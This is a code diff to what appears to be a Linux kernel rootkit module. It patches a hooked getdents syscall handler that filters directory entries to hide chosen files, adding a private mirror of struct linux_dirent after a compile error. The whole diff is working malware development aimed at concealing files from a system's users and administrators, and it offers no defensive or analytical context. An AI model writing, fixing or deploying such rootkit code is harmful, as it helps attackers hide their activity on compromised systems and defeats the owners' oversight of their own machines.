@@ -69,15 +69,24 @@ int is_file_hidden(const char *name) {
 /* ================================================================
  * Directory buffer filtering
  *
- * Both struct linux_dirent and struct linux_dirent64 keep
- * d_reclen at byte offset 16 (d_ino 8 + d_off 8 on x86_64), but
- * their d_name offset differs (d_type sits between reclen and
+ * struct linux_dirent is PRIVATE to fs/readdir.c (never exported to
+ * modules — the first real compile caught this), so we define our
+ * own mirror.  Both struct linux_dirent and struct linux_dirent64
+ * keep d_reclen at byte offset 16 (d_ino 8 + d_off 8 on x86_64),
+ * but their d_name offset differs (d_type sits between reclen and
  * name only in the 64-bit variant), hence the name_off argument.
  *
  * Hidden entries are absorbed into the PREVIOUS kept entry by
  * growing its d_reclen.  The caller must treat a return value of
  * 0 as "every entry in this batch was hidden" and report EOF.
  * ================================================================ */
+struct vk_dirent32 {
+    unsigned long d_ino;
+    unsigned long d_off;
+    unsigned short d_reclen;
+    char d_name[];
+};
+
 static long filter_dirents(void *kdirp, long ret, size_t name_off) {
     char *cur = (char *)kdirp;
     char *end = (char *)kdirp + ret;
@@ -172,7 +181,7 @@ asmlinkage long hooked_getdents(const struct pt_regs *regs) {
         return ret;
     }
 
-    kept = filter_dirents(kdirp, ret, offsetof(struct linux_dirent, d_name));
+    kept = filter_dirents(kdirp, ret, offsetof(struct vk_dirent32, d_name));
 
     if (kept == 0) {
         kfree(kdirp);
